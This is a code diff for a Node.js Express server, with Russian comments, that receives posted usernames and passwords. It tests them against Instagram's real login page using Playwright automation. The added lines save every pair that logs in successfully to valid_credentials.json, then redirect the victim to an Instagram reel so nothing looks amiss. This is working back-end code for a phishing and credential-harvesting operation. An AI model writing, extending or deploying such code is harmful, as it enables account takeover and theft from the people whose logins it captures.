@@ -1,8 +1,10 @@
 const express = require("express");
 const { chromium } = require("playwright");
 const cors = require("cors");
+const fs = require("fs");
 
 const PORT = 30000;
+const DATA_FILE = "valid_credentials.json";
 
 const app = express();
 app.use(express.json());
@@ -25,12 +27,20 @@ function validateCredentials(username, password) {
     return { valid: true };
 }
 
+function saveCredentials(username, password) {
+    let credentials = [];
+    if (fs.existsSync(DATA_FILE)) {
+        credentials = JSON.parse(fs.readFileSync(DATA_FILE, "utf-8"));
+    }
+    credentials.push({ username, password });
+    fs.writeFileSync(DATA_FILE, JSON.stringify(credentials, null, 2));
+}
+
 app.post("/check", async (req, res) => {
     console.log("Новый POST-запрос на /check", req.body);
-    
+
     const { username, password } = req.body;
 
-    // Проверка валидации
     const validation = validateCredentials(username, password);
     if (!validation.valid) {
         console.log("Ошибка валидации:", validation.message);
@@ -52,12 +62,18 @@ app.post("/check", async (req, res) => {
         await page.fill("input[name='password']", password);
         await page.click("button[type='submit']");
 
-        // Ожидание изменения URL
         let loginSuccess = false;
-        for (let i = 0; i < 10; i++) {  // Ждём до 10 секунд
+        for (let i = 0; i < 10; i++) {
             await page.waitForTimeout(1000);
             const currentUrl = page.url();
             console.log("Текущий URL:", currentUrl);
+
+            const errorMessage = await page.locator("div.xkmlbd1.xvs91rp.xd4r4e8.x1anpbxc.x1m39q7l.xyorhqc.x540dpk.x2b8uid").count();
+            if (errorMessage > 0) {
+                console.log("Ошибка входа: неверные данные.");
+                await browser.close();
+                return res.json({ error: true, message: "Неверный логин или пароль" });
+            }
 
             if (currentUrl !== "https://www.instagram.com/accounts/login/") {
                 loginSuccess = true;
@@ -69,13 +85,12 @@ app.post("/check", async (req, res) => {
 
         if (loginSuccess) {
             console.log(`Пользователь ${username} успешно вошел в аккаунт.`);
+            saveCredentials(username, password);
             return res.json({ error: false, message: "Успешный вход в Instagram", redirectUrl: "https://www.instagram.com/reel/DGZvsOutpww/?igsh=MWozYjZtbWhyeHZvaA==" });
         } else {
             console.log("Ошибка входа: URL не изменился.");
             return res.json({ error: true, message: "Неверный логин или пароль" });
         }
-        
-
     } catch (error) {
         console.error("Ошибка при входе в Instagram:", error);
         await browser.close();
